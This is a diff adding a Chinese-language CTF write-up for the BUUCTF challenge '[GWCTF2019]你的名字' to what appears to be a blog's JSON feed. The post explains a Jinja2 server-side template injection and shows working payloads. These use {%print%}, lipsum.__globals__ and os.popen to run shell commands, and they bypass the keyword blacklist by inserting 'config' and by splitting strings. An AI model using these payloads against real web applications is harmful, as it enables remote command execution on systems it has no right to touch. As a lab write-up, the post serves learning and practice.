@@ -204,6 +204,17 @@
             ]
         },
         {
+            "id": "http://odiws.github.io/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/",
+            "url": "http://odiws.github.io/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/",
+            "title": "[GWCTF2019]你的名字",
+            "date_published": "2024-09-22T12:40:09.000Z",
+            "content_html": "<h2 id=\"gwctf2019你的名字\"><a class=\"markdownIt-Anchor\" href=\"#gwctf2019你的名字\">#</a> [GWCTF2019] 你的名字</h2>\n<h2 id=\"3\"><a class=\"markdownIt-Anchor\" href=\"#3\">#</a> <img data-src=\"../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/3.png\" alt=\"3\"></h2>\n<p>进去就是一个 ssti 经典：好多东西被禁了</p>\n<pre><code>&#123;&#123;&#125;&#125;，union,select,/,/**/ \n这是被禁了，会在后面加上！禁了&#123;&#123;&#125;&#125;还以为不是ssti了\n然后就没了，虽然知道了也不会做········\n它用了&#123;%print %&#125;这种形式，这样就能打印出执行信息了\n</code></pre>\n<p>试了下</p>\n<pre><code>&#123;%print lipsum %&#125;，\n</code></pre>\n<p><img data-src=\"../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/4.png\" alt=\"4\"> 终于有回显了，有回显了就好开始下面的构造了</p>\n<pre><code>这里还得补充一点，&#123;%print %&#125;形式下，若果你构造的payload是正常的ssti用到的语句却没有回显，就说明你的语句中可能有关键字被过滤了，如&#123;%print ''.class %&#125;执行之后没有任何的回显，但&#123;%print ''.clconfigass %&#125;成功执行有回显，这说明class被过滤了\n</code></pre>\n<p>本体的黑名单源代码：</p>\n<p><img data-src=\"../../../../AppData/Roaming/Typora/typora-user-images/image-20240922205525074.png\" alt=\"image-20240922205525074\"></p>\n<p>这过滤代码挺傻的，是先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因为 config 字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行 config 的过滤，所以我们在过滤字符中加入 config 就可以绕过</p>\n<p><strong>所以最终的 payload 可以写成如下形式</strong></p>\n<pre><code>&#123;%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__('oconfigs').poconfigpen('whoami').read()%&#125;\n</code></pre>\n<p><strong>也可以拼接绕过</strong></p>\n<pre><code>&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('whoami').read()%&#125;\n</code></pre>\n<p>最后的 payload:</p>\n<pre><code>&#123;%set a='__bui'+'ltins__'%&#125;\n&#123;%set b='__im'+'port__'%&#125;\n&#123;%set c='o'+'s'%&#125;\n&#123;%set d='po'+'pen'%&#125;\n&#123;%print(lipsum['__globals__'][a][b](c)[d]('cat /flag_1s_Hera')['read']())%&#125;\n</code></pre>\n<pre><code>**用&#123;%print %&#125;解决了回显问题，网上的其他大多数文章为了解决无法回显的问题大多是选择外带的形式**\n</code></pre>\n<p><img data-src=\"../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/5.png\" alt=\"5\"></p>\n",
+            "tags": [
+                "buuctf",
+                "ssti"
+            ]
+        },
+        {
             "id": "http://odiws.github.io/2024/09/09/2020-Hurdles/",
             "url": "http://odiws.github.io/2024/09/09/2020-Hurdles/",
             "title": "2020]Hurdles",
